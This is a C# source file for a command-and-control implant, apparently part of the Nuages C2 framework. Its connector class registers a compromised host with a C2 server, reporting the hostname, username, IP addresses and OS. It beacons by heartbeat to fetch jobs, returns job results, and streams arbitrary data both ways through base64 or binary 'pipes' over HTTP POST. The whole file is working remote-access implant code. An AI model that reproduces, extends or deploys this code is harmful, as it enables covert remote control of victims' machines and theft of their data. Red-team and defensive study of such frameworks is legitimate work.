using System;
using System.Collections.Generic;
using System.IO;
using System.Json;
using System.Security.Policy;

namespace NuagesSharpImplant
{
    public class NuagesC2Connector
    {
        private NuagesC2Connection NC2Con;

        private bool supportsBinaryIO;

        public NuagesC2Connector(NuagesC2Connection NC2Con)
        {
            this.NC2Con = NC2Con;

            this.supportsBinaryIO = NC2Con.supportsBinaryIO();
        }

        public string getConnectionString()
        {
            return this.NC2Con.getConnectionString();
        }

        public string getHandler()
        {
            return this.NC2Con.getHandler();
        }

        public int getBufferSize()
        {
            return this.NC2Con.getBufferSize();
        }

        public int getRefreshRate()
        {
            return this.NC2Con.getRefreshRate();
        }
        public void setRefreshRate(int refreshrate)
        {

            this.NC2Con.setRefreshRate(refreshrate);

        }

        public void setBufferSize(int buffersize)
        {

            this.NC2Con.setBufferSize(buffersize);

        }
        string POST(string url, string jsonContent)
        {
            return this.NC2Con.POST(url, jsonContent);
        }

        byte[] POSTPipe(string pipe_id, byte[] input, long maxSize)
        {
            if (this.supportsBinaryIO)
            {
                string url = "io/" + pipe_id + "/" + maxSize;
                return this.NC2Con.POST(url, input);
            }
            else
            {
                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                list.Add(new KeyValuePair<string, JsonValue>("maxSize", 0));
                list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
                JsonObject body = new JsonObject(list);
                JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
                return Convert.FromBase64String(response["out"]);
            }

        }
        byte[] POSTPipe(string pipe_id, byte[] input)
        {
            if (this.supportsBinaryIO)
            {
                string url = "io/" + pipe_id;
                return this.NC2Con.POST(url, input);
            }
            else {
                List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
                list.Add(new KeyValuePair<string, JsonValue>("pipe_id", pipe_id));
                list.Add(new KeyValuePair<string, JsonValue>("in", Convert.ToBase64String(input)));
                JsonObject body = new JsonObject(list);
                JsonValue response = JsonValue.Parse(this.POST("io", body.ToString()));
                return Convert.FromBase64String(response["out"]);
            }

        }

        public void SubmitJobResult(string jobId, string result = "", bool moreData = false, bool error = false, int n = 0, string data = "")
        {
            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("jobId", jobId));
            list.Add(new KeyValuePair<string, JsonValue>("result", result));
            list.Add(new KeyValuePair<string, JsonValue>("moreData", moreData));
            list.Add(new KeyValuePair<string, JsonValue>("error", error));
            list.Add(new KeyValuePair<string, JsonValue>("n", n));
            list.Add(new KeyValuePair<string, JsonValue>("data", data));
            JsonObject body = new JsonObject(list);
            this.POST("jobresult", body.ToString());
        }

        public string RegisterImplant(string type = "", string hostname = "", string username = "", string localIp = "", string sourceIp = "", string os = "", string handler = "", string connectionString = "", Dictionary<string, string> config = null, String[] supportedPayloads = null)
        {

            List<KeyValuePair<string, JsonValue>> configList = new List<KeyValuePair<string, JsonValue>>();
            foreach (KeyValuePair<string, string> p in config)
            {
                configList.Add(new KeyValuePair<string, JsonValue>(p.Key, p.Value));
            }
            JsonObject configObject = new JsonObject(configList);

            JsonArray supportedPayloadsArray = new JsonArray();

            foreach (string p in supportedPayloads) {
                supportedPayloadsArray.Add(p);
            }

            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("implantType", type));
            list.Add(new KeyValuePair<string, JsonValue>("hostname", hostname));
            list.Add(new KeyValuePair<string, JsonValue>("username", username));
            list.Add(new KeyValuePair<string, JsonValue>("localIp", localIp));
            list.Add(new KeyValuePair<string, JsonValue>("sourceIp", sourceIp));
            list.Add(new KeyValuePair<string, JsonValue>("os", os));
            list.Add(new KeyValuePair<string, JsonValue>("handler", handler));
            list.Add(new KeyValuePair<string, JsonValue>("connectionString", connectionString));
            list.Add(new KeyValuePair<string, JsonValue>("config", configObject));
            list.Add(new KeyValuePair<string, JsonValue>("supportedPayloads", supportedPayloadsArray));
            JsonObject body = new JsonObject(list);

            JsonValue response = JsonValue.Parse(this.POST("register", body.ToString()));
            return response["_id"];
        }

        public JsonArray Heartbeat(string implantId)
        {
            List<KeyValuePair<string, JsonValue>> list = new List<KeyValuePair<string, JsonValue>>();
            list.Add(new KeyValuePair<string, JsonValue>("id", implantId));
            JsonObject body = new JsonObject(list);
            JsonValue response = JsonValue.Parse(this.POST("heartbeat", body.ToString()));
            return (JsonArray)response["data"];
        }

        public byte[] PipeRead(string pipe_id, int BytesWanted)
        {
            byte[] buffer;
            using (MemoryStream memory = new MemoryStream())
            {
                while (memory.Length < BytesWanted)
                {
                    buffer = POSTPipe(pipe_id, new byte[0], Math.Min(this.getBufferSize(), BytesWanted - memory.Length));
                    memory.Write(buffer, 0, buffer.Length);
                    System.Threading.Thread.Sleep(this.getRefreshRate());
                }
                return memory.ToArray();
            }
        }

        public void Pipe2Stream(string pipe_id, int BytesWanted, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer;
            while (ReadBytes < BytesWanted)
            {
                buffer = POSTPipe(pipe_id, new byte[0], Math.Min(this.getBufferSize(), BytesWanted - ReadBytes));
                ReadBytes += buffer.Length;
                stream.Write(buffer, 0, buffer.Length);
                System.Threading.Thread.Sleep(this.getRefreshRate());
            }
        }

        public void Stream2Pipe(string pipe_id, Stream stream)
        {
            int ReadBytes = 0;
            byte[] buffer = new byte[this.getBufferSize()];
            while ((ReadBytes = stream.Read(buffer, 0, this.getBufferSize())) > 0)
            {
                if (ReadBytes < this.getBufferSize())
                {
                    byte[] buffer2 = new byte[ReadBytes];
                    Array.Copy(buffer, 0, buffer2, 0, ReadBytes);
                    POSTPipe(pipe_id, buffer2, 0);
                }
                else
                {
                    POSTPipe(pipe_id, buffer, 0);
                    System.Threading.Thread.Sleep(this.getRefreshRate());
                }
            }
        }

        public byte[] PipeRead(string pipe_id)
        {
            return POSTPipe(pipe_id, new byte[0], this.getBufferSize());
        }

        public void PipeWrite(string pipe_id, byte[] data)
        {
            int sentData = 0;
            int refreshrate = this.getRefreshRate();
            int bufferSize = this.getBufferSize();
            byte[] buffer = new byte[bufferSize];
            while (sentData < data.Length)
            {
                if ((data.Length - sentData) < bufferSize) {
                    byte[] buffer2 = new byte[data.Length - sentData];
                    Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
                    POSTPipe(pipe_id, buffer2, 0);
                    sentData = data.Length;
                }
                else
                {
                    Array.Copy(data, sentData, buffer, 0, bufferSize);
                    POSTPipe(pipe_id, buffer, 0);
                    sentData += bufferSize;
                    System.Threading.Thread.Sleep(refreshrate);
                }
            }
            return;
        }

        public byte[] PipeReadWrite(string pipe_id, byte[] data)
        {
            int sentData = 0;
            int refreshrate = this.getRefreshRate();
            int bufferSize = this.getBufferSize();
            byte[] buffer = new byte[bufferSize];
            byte[] buffer3;
            using (MemoryStream memory = new MemoryStream()) { 
                while (sentData < data.Length)
                {
                    if ((data.Length - sentData) < bufferSize)
                    {
                        byte[] buffer2 = new byte[data.Length - sentData];
                        Array.Copy(data, sentData, buffer2, 0, data.Length - sentData);
                        buffer3 = POSTPipe(pipe_id, buffer2, bufferSize);
                        sentData = data.Length;
                    }
                    else
                    {
                        Array.Copy(data, sentData, buffer, 0, bufferSize);
                        buffer3 = POSTPipe(pipe_id, buffer, bufferSize);
                        sentData += bufferSize;
                        System.Threading.Thread.Sleep(refreshrate);
                    }
                    memory.Write(buffer3, 0, buffer3.Length);
                }
                return memory.ToArray();
            }

        }
    }
}

